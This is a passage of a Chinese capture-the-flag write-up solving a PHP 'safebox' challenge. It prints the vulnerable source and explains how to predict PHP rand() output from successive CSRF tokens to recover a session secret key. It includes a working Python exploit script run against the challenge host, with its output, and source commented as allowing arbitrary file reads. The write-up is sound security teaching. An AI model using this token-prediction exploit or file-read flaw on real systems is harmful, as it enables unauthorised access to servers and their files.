+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_REQUESTED_WITH'</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+        <span class="nb">strcasecmp</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_REQUESTED_WITH'</span><span class="p">],</span> <span class="s1">'XMLHttpRequest'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: application/json"</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/html; charset=UTF-8"</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">//每次提交check之后，将CSRF_TOKEN置为null</span>
+<span class="k">function</span> <span class="nf">check_csrf_token</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">])</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">]</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">//显示form页面</span>
+<span class="k">function</span> <span class="nf">show_form_page</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">    &lt;!DOCTYPE html&gt;</span>
+<span class="x">    &lt;html lang="en"&gt;</span>
+<span class="x">    &lt;head&gt;</span>
+<span class="x">        &lt;meta charset="UTF-8"&gt;</span>
+<span class="x">        &lt;title&gt;safebox&lt;/title&gt;</span>
+<span class="x">        &lt;link rel="stylesheet" href="style.css"&gt;</span>
+<span class="x">    &lt;/head&gt;</span>
+<span class="x">    &lt;body&gt;</span>
+
+<span class="x">    &lt;div class="container"&gt;</span>
+<span class="x">        &lt;form method="post"&gt;</span>
+<span class="x">        &lt;div class="block title"&gt;</span>
+<span class="x">            安全箱子</span>
+<span class="x">        &lt;/div&gt;</span>
+<span class="x">        &lt;div class="block show"&gt;</span>
+<span class="x">            &lt;div class="line"&gt;</span>
+<span class="x">                &lt;label&gt;输入验证字符串: &lt;/label&gt;</span>
+<span class="x">                &lt;input type="text" name="key"&gt;</span>
+<span class="x">            &lt;/div&gt;</span>
+<span class="x">            &lt;div class="line"&gt;</span>
+<span class="x">                &lt;label&gt;输入方法　　　: &lt;/label&gt;</span>
+<span class="x">                &lt;input type="text" name="act"&gt;</span>
+<span class="x">            &lt;/div&gt;</span>
+<span class="x">        &lt;/div&gt;</span>
+<span class="x">        &lt;div class="block info"&gt;</span>
+<span class="x">            &lt;input type="reset" value="重置"&gt;</span>
+<span class="x">            &lt;input name="submit" type="submit" value="提交"&gt;</span>
+<span class="x">            &lt;input type="hidden" name="CSRF_TOKEN" value="</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">"&gt;</span>
+<span class="x">        &lt;/div&gt;</span>
+<span class="x">        &lt;/form&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+
+<span class="x">    &lt;/body&gt;</span>
+<span class="x">    &lt;/html&gt;</span>
+<span class="x">    </span><span class="cp">&lt;?php</span>
+<span class="p">}</span>
+
+<span class="c1">//显示报错页面</span>
+<span class="k">function</span> <span class="nf">show_error_page</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">    &lt;!DOCTYPE html&gt;</span>
+<span class="x">    &lt;html lang="en"&gt;</span>
+<span class="x">    &lt;head&gt;</span>
+<span class="x">        &lt;meta charset="UTF-8"&gt;</span>
+<span class="x">        &lt;title&gt;Error&lt;/title&gt;</span>
+<span class="x">        &lt;link rel="stylesheet" href="style.css"&gt;</span>
+<span class="x">        &lt;!-- ?x_show_source --&gt;</span>
+<span class="x">    &lt;/head&gt;</span>
+<span class="x">    &lt;body&gt;</span>
+
+<span class="x">    &lt;div class="container"&gt;</span>
+<span class="x">        &lt;div class="block title"&gt;</span>
+<span class="x">            Error</span>
+<span class="x">        &lt;/div&gt;</span>
+<span class="x">        &lt;div class="block show"&gt;</span>
+<span class="x">            </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">        &lt;/div&gt;</span>
+<span class="x">        &lt;div class="block info"&gt;</span>
+<span class="x">            &lt;a href="javascript:history.back(-1)"&gt;返回&lt;/a&gt;</span>
+<span class="x">        &lt;/div&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+
+<span class="x">    &lt;/body&gt;</span>
+<span class="x">    &lt;/html&gt;</span>
+<span class="x">    </span><span class="cp">&lt;?php</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$act</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'act'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'act'</span><span class="p">]</span> <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>
+<span class="nv">$key</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'key'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]</span> <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">check_csrf_token</span><span class="p">())</span> <span class="p">{</span>                 <span class="c1">//csrf_token校验</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'md5'</span><span class="p">,</span> <span class="nv">$act</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">])</span> <span class="o">===</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//hmac_md5校验</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$act</span><span class="p">))</span> <span class="p">{</span>                                 <span class="c1">//函数存在性校验</span>
+            <span class="nv">$exec_res</span> <span class="o">=</span> <span class="nv">$act</span><span class="p">();</span>                                     <span class="c1">//调用指定函数</span>
+            <span class="nx">output</span><span class="p">(</span><span class="nv">$exec_res</span><span class="p">);</span>                                      <span class="c1">//输出函数返回结果</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">show_error_page</span><span class="p">(</span><span class="s2">"Function not found!!"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">show_error_page</span><span class="p">(</span><span class="s2">"Permission deny!!"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">show_form_page</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>所以重点在与最后的指定函数调用，分析如下：</p>
+<ol>
+<li>csrf_token校验：这里保证了提交的crsf_token的正确性，但小白我没有看出存在csrf的场景，token略显可疑</li>
+<li>hmac_md5校验：对于<a href="http://www.cnblogs.com/soundcode/p/3802344.html">HMAC-MD5</a>，自认为算法上不存在什么缺陷，又是<code>===</code>进行判断，就使得我们必须知道<code>$_SESSION['SECRET_KEY']</code>的确切值，才能进入之后的if逻辑</li>
+<li>函数存在性校验：先检验载调用函数，而这里具有利用价值的估计就是包含在flag.php中的函数了</li>
+<li>调用指定函数：无参数传递，感觉会是个小坑哈</li>
+<li>输出函数返回结果：两种输出方式二选其一，猜测作者这里也另有目的</li>
+</ol>
+<p>在程序中，对于每一个session都会先生成6位SECRET_KEY保持不变，在每次提交后对16位的CSRF_TOKEN进行变化。要知道
+SECRET_KEY的确切值，我首先想到的是暴力破解，虽然62**6不是太大，可是后续的套具体还不知道，而且出题人也不会这么无聊，尝试了一下就放
+弃了这个想法。既然不能猜那就预测呗，我的痛苦经历让我想到了一次CTF的rand()预测题目，具体原理与题目可见：</p>
+<ul>
+<li><a href="http://www.freebuf.com/articles/web/99093.html">http://www.freebuf.com/articles/web/99093.html</a></li>
+<li><a href="http://www.mscs.dal.ca/%7Eselinger/random/">http://www.mscs.dal.ca/~selinger/random/</a></li>
+</ul>
+<p>有没感觉很像，CTF题目中是多次输出rand()的值，再结合其生成算法，根据其之前生成的值预测之后的值：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">O_31</span> <span class="o">=</span> O_0 + O_28 mod 2**31
+<span class="nv">O_32</span> <span class="o">=</span> O_1 + O_29 mod 2**31
+<span class="nv">O_33</span> <span class="o">=</span> O_2 + O_30 mod 2**31
+<span class="nv">O_34</span> <span class="o">=</span> O_3 + O_31 mod 2**31 
+<span class="nv">O_35</span> <span class="o">=</span> O_4 + O_32 mod 2**31
+<span class="nv">O_36</span> <span class="o">=</span> O_5 + O_33 mod 2**31
+</pre></div>
+</td></tr></tbody></table>
+
+<p>而我们这里呢，是每次提交后CSRF_TOKEN都会变化，而token中的字符根据对应关系也就是由rand()生成的值。但他们是向后预测，我们好像是向前推理，那该怎么办呢？加法会减法就不会啦?！</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">O_0</span> <span class="o">=</span> O_31 - O_28 mod 2**31
+...
+<span class="nv">O_5</span> <span class="o">=</span> O_36 - O_33 mod 2**31
+</pre></div>
+</td></tr></tbody></table>
+
+<p>可是我们这里的rand()是有范围的那该如何呢，<a href="https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=php%20rand%20source%20code">搜一搜</a>翻出对应的<a href="https://github.com/php/php-src/blob/PHP-5.6.21/ext/standard/rand.c">源码</a>即可找到答案：</p>
+<p><img alt="" src="Larry_files/3.png"></p>
+<p><img alt="" src="Larry_files/4.png"></p>
+<p>对于<code>n' = a + n(b-a+1)/(M+1)</code>，我们先令a=0,b=61化简成<code>n' = 62n/(M+1)</code>,把运算用于整个公式，我再偷一下懒最后使用<code>(o[31+i]+62-o[28+i])%62</code>来推算前6位的SECRET_KEY，初步代码（new-1.py）如下：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47</pre></div></td><td class="code"><div class="codehilite"><pre><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">hmac</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="n">str_list</span> <span class="o">=</span> <span class="s">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
+<span class="n">re_csrf_token</span> <span class="o">=</span> <span class="s">r'(?&lt;=value=").*?(?=")'</span>
+<span class="n">action</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)):</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="n">token</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
+                <span class="n">d</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+                <span class="k">break</span>
+    <span class="k">return</span> <span class="n">d</span>
+
+<span class="k">def</span> <span class="nf">guess</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">a</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="mi">31</span><span class="o">+</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mi">62</span><span class="o">-</span><span class="n">d</span><span class="p">[</span><span class="mi">28</span><span class="o">+</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">62</span>
+        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">result</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+<span class="n">r0</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="n">token0</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r0</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">d0</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token0</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
+<span class="n">payload0</span> <span class="o">=</span> <span class="p">{</span><span class="s">'submit'</span><span class="p">:</span><span class="s">'go'</span><span class="p">,</span> <span class="s">'CSRF_TOKEN'</span><span class="p">:</span><span class="n">token0</span><span class="p">,</span> <span class="s">'act'</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">'key'</span><span class="p">:</span><span class="s">'1234567'</span><span class="p">}</span>
+<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload0</span><span class="p">)</span>
+<span class="n">r1</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="n">token1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">d1</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token1</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
+<span class="n">pre</span> <span class="o">=</span>  <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="n">d0</span><span class="o">+</span><span class="n">d1</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">guess</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span><span class="n">str_list</span><span class="p">,</span><span class="n">action</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="s">'submit'</span><span class="p">:</span><span class="s">'go'</span><span class="p">,</span> <span class="s">'CSRF_TOKEN'</span><span class="p">:</span><span class="n">token1</span><span class="p">,</span> <span class="s">'act'</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">'key'</span><span class="p">:</span><span class="n">key</span><span class="p">}</span>
+<span class="n">r2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload1</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="s">'Permission deny!!'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'[+]Done!'</span>
+    <span class="k">print</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>由于rand生成算法中有加1的随机情况存在，所以这里就需要多推测几次得到正确的SECRET_KEY，进入if逻辑调用函数，所以再写一个初步的代码（get-1.py）重复测试</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11</pre></div></td><td class="code"><div class="codehilite"><pre><span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#coding=utf-8</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">'python'</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]])</span>
+    <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">output</span>
+        <span class="k">break</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>运行得到如下输出：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>python get-1.py new-1.py flag
+<span class="o">[</span>+<span class="o">]</span>Done!
+    &lt;!DOCTYPE html&gt;
+    &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span>&gt;
+    &lt;head&gt;
+        &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span>&gt;
+        &lt;title&gt;Error&lt;/title&gt;
+        &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"style.css"</span>&gt;
+        &lt;!-- ?x_show_source --&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+
+    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span>&gt;
+        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"block title"</span>&gt;
+            Error
+        &lt;/div&gt;
+        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"block show"</span>&gt;
+            Function not found!!        &lt;/div&gt;
+        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"block info"</span>&gt;
+            &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"javascript:history.back(-1)"</span>&gt;返回&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;/body&gt;
+    &lt;/html&gt;
+</pre></div>
+</td></tr></tbody></table>
+
+<p>显然我这样瞎猜函数不会是个头，那就必须知道flag.php中是否有函数可供我们利用呢，所以我们就得知道哪些函数可以查看当前脚本中定义的函数，变量，常量等信息，百度一下你就知道：<a href="http://www.jb51.net/article/42890.htm">PHP输出当前进程所有变量/常量/模块/函数/类的示例</a>，正好还都是不需要参数的。我首先利用get_defined_vars()和get_defined_constants()看看能不能直接脱出flag变量或者常量，然而并没有我想象的那么简单。那就用get_defined_functions看看吧：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>python get-1.py new-1.py get_defined_functions
+<span class="o">[</span>+<span class="o">]</span>Done!
+&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Array to string conversion in &lt;b&gt;/app/index.php&lt;/b&gt; on line &lt;b&gt;45&lt;/b&gt;&lt;br /&gt;
+Array
+</pre></div>
+</td></tr></tbody></table>
+
+<p>这里函数的结果是个数组，而strval()对数组的变换同一是”Array”。那就试试让其用json响应呗，根据<a href="http://stackoverflow.com/questions/28610376/sending-an-jquery-ajax-get-request-with-python-request-library">stackoverflow</a>上大神的回答，我们加个<code>'X-Requested-With': 'XMLHttpRequest'</code>的header就好了，输出如下（有省略）：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>python get-1.py new-1.py get_defined_functions
+<span class="o">[</span>+<span class="o">]</span>Done!
+<span class="o">{</span><span class="s2">"internal"</span>:<span class="o">[</span><span class="s2">"zend_version"</span>,...<span class="o">]</span>,<span class="s2">"user"</span>:<span class="o">[</span><span class="s2">"rand_str"</span>,<span class="s2">"output"</span>,<span class="s2">"check_csrf_token"</span>,<span class="s2">"show_form_page"</span>,<span class="s2">"show_error_page"</span>,<span class="s2">"_fd_init"</span>,<span class="s2">"fd_show_source"</span>,<span class="s2">"fd_config"</span>,<span class="s2">"fd_error"</span>,<span class="s2">"fg_safebox"</span><span class="o">]}</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>主要关注的是最后一个数组中用户定义的函数，哎呦，有个fd_show_source的函数，试试没准flag就出来了。</p>
+<h1 id="0x02"><a name="user-content-0x02" href="#0x02" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x02 绕过</h1>
+<hr>
+<p>事情并没有我们想象的那么简单，看来是作者又给我们下了一个套，fd_show_source函数输出整理如下（已加个人注解）：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+ 10
+ 11
+ 12
+ 13
+ 14
+ 15
+ 16
+ 17
+ 18
+ 19
+ 20
+ 21
+ 22
+ 23
+ 24
+ 25
+ 26
+ 27
+ 28
+ 29
+ 30
+ 31
+ 32
+ 33
+ 34
+ 35
+ 36
+ 37
+ 38
+ 39
+ 40
+ 41
+ 42
+ 43
+ 44
+ 45
+ 46
+ 47
+ 48
+ 49
+ 50
+ 51
+ 52
+ 53
+ 54
+ 55
+ 56
+ 57
+ 58
+ 59
+ 60
+ 61
+ 62
+ 63
+ 64
+ 65
+ 66
+ 67
+ 68
+ 69
+ 70
+ 71
+ 72
+ 73
+ 74
+ 75
+ 76
+ 77
+ 78
+ 79
+ 80
+ 81
+ 82
+ 83
+ 84
+ 85
+ 86
+ 87
+ 88
+ 89
+ 90
+ 91
+ 92
+ 93
+ 94
+ 95
+ 96
+ 97
+ 98
+ 99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109</pre></div></td><td class="code"><div class="codehilite"><pre><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd"> * Created by PhpStorm.</span>
+<span class="sd"> * User: phithon</span>
+<span class="sd"> * Date: 16/6/8</span>
+<span class="sd"> * Time: 上午12:24</span>
+<span class="sd"> */</span>
+
+<span class="k">class</span> <span class="nc">SafeBox</span> <span class="p">{</span>
+
+    <span class="c1">//貌似可产生任意文件读取</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">_read_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"/"</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//通过POST filename可读取任意文件</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]</span> <span class="o">:</span> <span class="s2">"box.txt"</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">view</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">'box.txt'</span><span class="p">);</span>
+        <span class="nv">$i</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'i'</span><span class="p">])</span> <span class="o">?</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'i'</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$lines</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$lines</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">:</span> <span class="s2">"None"</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">alist</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">'box.txt'</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nv">$lines</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">random</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">'box.txt'</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nv">$lines</span><span class="p">[</span><span class="nb">array_rand</span><span class="p">(</span><span class="nv">$lines</span><span class="p">)];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">_fd_init</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">//定义role必须为guest</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
